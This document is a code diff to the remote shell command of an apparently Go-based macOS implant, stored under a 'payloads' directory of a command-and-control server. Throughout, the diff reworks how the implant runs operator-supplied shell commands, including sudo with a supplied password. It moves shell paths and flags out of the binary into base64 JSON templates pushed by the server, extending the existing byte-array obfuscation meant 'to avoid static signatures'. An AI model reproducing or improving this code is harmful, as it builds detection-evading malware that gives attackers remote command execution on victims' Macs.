@@ -1,4 +1,4 @@
-// server/docker/payloads/Darwin/action_shell_darwin.go
+// server/docker/payloads/TCP_Darwin/action_shell_darwin.go
 
 //go:build darwin
 // +build darwin
@@ -8,6 +8,8 @@ package main
 import (
 	"bytes"
 	"context"
+	"encoding/base64"
+	"encoding/json"
 	"os"
 	"os/exec"
 	"strconv"
@@ -15,66 +17,119 @@ import (
 	"time"
 )
 
-// Shell strings (constructed to avoid static signatures)
-var (
-	// Command name
-	shellCmdName = string([]byte{0x73, 0x68, 0x65, 0x6c, 0x6c}) // shell
+// ShellTemplate matches the server's CommandTemplate structure
+type ShellTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
 
-	// Flag arguments
-	shellFlagSudo    = string([]byte{0x2d, 0x2d, 0x73, 0x75, 0x64, 0x6f})                         // --sudo
-	shellFlagTimeout = string([]byte{0x2d, 0x2d, 0x74, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74})       // --timeout
-
-	// Environment variable
-	shellEnvShell = string([]byte{0x53, 0x48, 0x45, 0x4c, 0x4c}) // SHELL
-
-	// Shell paths
-	shellBinBash    = string([]byte{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68})                               // /bin/bash
-	shellBinZsh     = string([]byte{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a, 0x73, 0x68})                                     // /bin/zsh
-	shellBinSh      = string([]byte{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68})                                           // /bin/sh
-	shellUsrBinBash = string([]byte{0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68})       // /usr/bin/bash
-	shellUsrBinZsh  = string([]byte{0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a, 0x73, 0x68})             // /usr/bin/zsh
-	shellUsrBinSh   = string([]byte{0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68})                   // /usr/bin/sh
-
-	// Fallback shell and arguments
-	shellFallback = string([]byte{0x73, 0x68})       // sh
-	shellArgC     = string([]byte{0x2d, 0x63})       // -c
+// Template indices - must match server's common.go
+const (
+	idxShellPathBinBash    = 100
+	idxShellPathBinZsh     = 101
+	idxShellPathBinSh      = 102
+	idxShellPathUsrBinBash = 103
+	idxShellPathUsrBinZsh  = 104
+	idxShellPathUsrBinSh   = 105
+	idxShellFallback       = 106
+	idxShellEnvVar         = 107
+	idxShellArgC           = 108
+	idxShellFlagSudo       = 109
+	idxShellFlagTimeout    = 110
+	idxShellStderrMarker   = 111
 )
 
-type ShellCommand struct{}
+// Short flags (transformed by server, stored as byte arrays for minimal footprint)
+var (
+	flagSudo    = string([]byte{0x2d, 0x73}) // -s
+	flagTimeout = string([]byte{0x2d, 0x74}) // -t
+	fallbackSh  = string([]byte{0x73, 0x68}) // sh
+	fallbackArg = string([]byte{0x2d, 0x63}) // -c
+)
+
+type ShellCommand struct {
+	tpl *ShellTemplate
+}
+
+// getTpl safely retrieves a template string by index
+func (c *ShellCommand) getTpl(idx int) string {
+	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
+		return c.tpl.Templates[idx]
+	}
+	return ""
+}
 
 // getUnixShell determines the appropriate shell to use on Unix-like systems
-func getUnixShell() string {
+func (c *ShellCommand) getUnixShell() string {
 	// Try to get the user's default shell from SHELL environment variable
-	if shell := os.Getenv(shellEnvShell); shell != "" {
-		// Verify the shell exists and is executable
-		if _, err := os.Stat(shell); err == nil {
-			return shell
+	envVar := c.getTpl(idxShellEnvVar)
+	if envVar != "" {
+		if shell := os.Getenv(envVar); shell != "" {
+			if _, err := os.Stat(shell); err == nil {
+				return shell
+			}
 		}
 	}
 
 	// Fallback chain: try common shells in order of preference
-	shells := []string{
-		shellBinBash,
-		shellBinZsh,
-		shellBinSh,
-		shellUsrBinBash,
-		shellUsrBinZsh,
-		shellUsrBinSh,
+	shellPaths := []int{
+		idxShellPathBinBash,
+		idxShellPathBinZsh,
+		idxShellPathBinSh,
+		idxShellPathUsrBinBash,
+		idxShellPathUsrBinZsh,
+		idxShellPathUsrBinSh,
 	}
 
-	for _, shell := range shells {
-		if _, err := os.Stat(shell); err == nil {
-			return shell
+	for _, idx := range shellPaths {
+		shell := c.getTpl(idx)
+		if shell != "" {
+			if _, err := os.Stat(shell); err == nil {
+				return shell
+			}
 		}
 	}
 
 	// Last resort fallback
-	return shellFallback
+	if fb := c.getTpl(idxShellFallback); fb != "" {
+		return fb
+	}
+	return fallbackSh
 }
+
 func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from Command.Data - required for operation
+	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	if err != nil {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	c.tpl = &ShellTemplate{}
+	if err := json.Unmarshal(decoded, c.tpl); err != nil {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
 	if len(args) == 0 {
 		return CommandResult{
-			Output: "",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -86,11 +141,21 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	useSudo := false
 	sudoPassword := ""
 
+	// Get flag strings from template (or use minimal fallbacks)
+	sudoFlag := c.getTpl(idxShellFlagSudo)
+	if sudoFlag == "" {
+		sudoFlag = flagSudo
+	}
+	timeoutFlag := c.getTpl(idxShellFlagTimeout)
+	if timeoutFlag == "" {
+		timeoutFlag = flagTimeout
+	}
+
 	// Parse flags
 	i := 0
 	for i < len(args) {
 		switch args[i] {
-		case shellFlagSudo:
+		case sudoFlag:
 			if i+1 >= len(args) {
 				return CommandResult{
 					Output:      Err(E20),
@@ -102,7 +167,7 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			sudoPassword = args[i+1]
 			i += 2
 
-		case shellFlagTimeout:
+		case timeoutFlag:
 			if i+1 >= len(args) {
 				return CommandResult{
 					Output:      Err(E20),
@@ -157,12 +222,18 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	} else {
 		// Regular shell execution
-		shell := getUnixShell()
+		shell := c.getUnixShell()
+
+		// Get -c argument from template
+		shellArg := c.getTpl(idxShellArgC)
+		if shellArg == "" {
+			shellArg = fallbackArg
+		}
 
 		execContext, cancel := context.WithTimeout(context.Background(), timeout)
 		defer cancel()
 
-		cmd := exec.CommandContext(execContext, shell, shellArgC, commandStr)
+		cmd := exec.CommandContext(execContext, shell, shellArg, commandStr)
 		cmd.Dir = workingDir
 
 		var stdout, stderr bytes.Buffer
@@ -176,7 +247,13 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			if commandOutput != "" {
 				commandOutput += "\n"
 			}
-			commandOutput += stderr.String()
+			// Get stderr marker from template
+			stderrMarker := c.getTpl(idxShellStderrMarker)
+			if stderrMarker != "" {
+				commandOutput += stderrMarker + stderr.String()
+			} else {
+				commandOutput += stderr.String()
+			}
 		}
 
 		if cmdErr != nil {
